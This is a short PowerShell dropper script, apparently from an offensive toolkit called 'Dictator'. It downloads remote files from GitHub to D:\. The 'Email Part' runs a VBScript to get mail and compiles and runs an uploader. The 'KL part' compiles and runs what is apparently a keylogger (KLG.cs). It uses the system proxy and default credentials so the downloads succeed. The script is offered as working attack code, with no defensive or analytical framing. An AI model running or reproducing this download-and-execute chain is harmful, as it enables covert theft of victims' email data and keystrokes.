#Email Part

$path_vb_ms = [System.IO.Path]::GetTempPath()
$path_vb_ms=$path_vb_ms+"get_mail.vbs"
$my_path="D:\gmm.vbs"
$url='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/get_email.vbs';
$b=new-object net.webclient;
$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$b.DownloadFile($url, $my_path) ;
$command = "cmd /C cscript "+$my_path
invoke-expression $command
$my_path_c="D:\up.cs"
$url_c='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/up.cs';
$b.DownloadFile($url_c, $my_path_c) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\up.exe D:\up.cs"
invoke-expression $command
$command="cmd /C D:\up.exe"
invoke-expression $command

#KL part
$my_path_k="D:\KLG.cs"
$url_k='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/KLG.cs';
$b.DownloadFile($url_k, $my_path_k) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\KLG.exe D:\KLG.cs"
invoke-expression $command
$command="cmd /C D:\KLG.exe"
invoke-expression $command
